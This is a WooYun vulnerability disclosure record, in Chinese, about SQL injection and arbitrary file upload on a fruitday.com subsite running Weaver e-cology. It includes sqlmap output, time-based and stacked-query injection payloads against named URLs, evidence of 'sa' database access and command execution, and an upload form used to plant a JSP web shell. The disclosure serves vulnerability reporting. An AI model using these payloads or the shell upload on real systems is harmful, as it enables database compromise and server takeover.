{"id": 22878, "wybug_id": "wooyun-2015-0130601", "wybug_title": "天天果园某分站存在多处SQL注入，且可任意上传导致GetShell", "wybug_corp": "fruitday.com", "wybug_author": "浮萍", "wybug_date": "2015-07-31 08:32", "wybug_open_date": "2015-09-18 11:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向公众公开  简要描述： SQL注入任意文件上传 详细说明：  http://hq.fruitday.com:88/login/Login.jsp?logintype=1天天鲜果协同商务系统采用的泛微系统根据 WooYun: 泛微e-cology系统又一sql注入（无需登录）  WooYun: 泛微某系统漏洞集合（不拿shell不是合格的白帽子）  WooYun: 泛微某系统通用型SQL注入(无需登录) 构造注入点第一处\nhttp://hq.fruitday.com:88//homepage/LoginHomepage.jsp?hpid=52*&isfromportal=1\n在hpid处\nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 115 HTTP(s) requests:---Parameter: #1* (URI)    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: http://hq.fruitday.com:88//homepage/LoginHomepage.jsp?hpid=52 WAITFOR DELAY '0:0:5'&isfromportal=1---\n\nweb application technology: JSPback-end DBMS: Microsoft SQL Server 2008\n数据库\nback-end DBMS: Microsoft SQL Server 2008available databases [7]:[*] ecology[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb\n   漏洞证明：  第二处：\nhttp://hq.fruitday.com:88/weaver/weaver.email.FileDownloadLocation?fileid=39*&download=1\n\nsqlmap identified the following injection points with a total of 92 HTTP(s) requests:---Parameter: #1* (URI)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: http://hq.fruitday.com:88/weaver/weaver.email.FileDownloadLocation?fileid=39;WAITFOR DELAY '0:0:5'--&download=1---back-end DBMS: Microsoft SQL Server 2008sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---\n数据库\nback-end DBMS: Microsoft SQL Server 2008available databases [7]:[*] ecology[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb\n\ncurrent database:    'ecology'current user:    'sa'\n\n\n执行ipconfig\n\n三 任意文件上传构造表单\n<form method='post' action='http://hq.fruitday.com:88/tools/SWFUpload/upload.jsp'  enctype=\"multipart/form-data\" > <input type=\"file\" id=\"file\" name=\"test\" style=\"height:20px;BORDER: #8F908B 1px solid;\"/><button type=submit value=\"getshell\">getshell</button> </form>\n上传文件然后访问http://hq.fruitday.com:88/null1.jsp\n\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-04 11:19 厂商回复： 非常感谢您提供的信息，我们会尽快确认。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-04 11:45 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:46        | 就恨自己服务器太少)\t\t \n  尼玛20rank？？？？    \n     2015-08-04 12:00 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:87        | 默默潜水)\t\t \n  @Manning 果园的Rank都比较高呀    \n     2015-09-18 18:49 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  为什么我都找不到果园的漏洞了的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}